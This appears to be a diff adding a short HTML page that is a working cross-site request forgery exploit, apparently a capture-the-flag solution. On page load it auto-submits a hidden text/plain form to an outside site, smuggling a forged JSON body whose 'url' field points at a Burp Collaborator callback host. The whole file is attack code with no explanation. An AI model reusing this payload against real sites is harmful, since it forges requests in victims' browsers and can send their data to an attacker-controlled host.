@@ -1,0 +1,40 @@
+<html>
+    <body>
+        <script>
+            function OpenWindowWithPost(url, windowoption, name, param)
+           {
+                    var form = document.createElement("form");
+                    form.setAttribute("method", "post");
+                    form.setAttribute("action", url);
+                    form.setAttribute("target", name);
+                    form.setAttribute('enctype', 'text/plain');
+
+
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = '{"bypass":"';
+                    input.value = param;
+                    form.appendChild(input);
+
+
+                    document.body.appendChild(form);
+
+                    window.open("openpls.htm", name, windowoption);
+
+                    form.submit();
+
+                    document.body.removeChild(form);
+            }
+
+           function Post()
+           {
+               var param = '","yep":"yep yep yep", "url":"https://pb4aqanl42lxqc3z607e98jjeak38s.burpcollaborator.net"}'
+              OpenWindowWithPost("https://phpme.be.ax//",
+              "width=1000,height=600",
+              "Post", param);
+            }
+
+            window.onload=Post();
+        </script>
+    </body>
+</html>
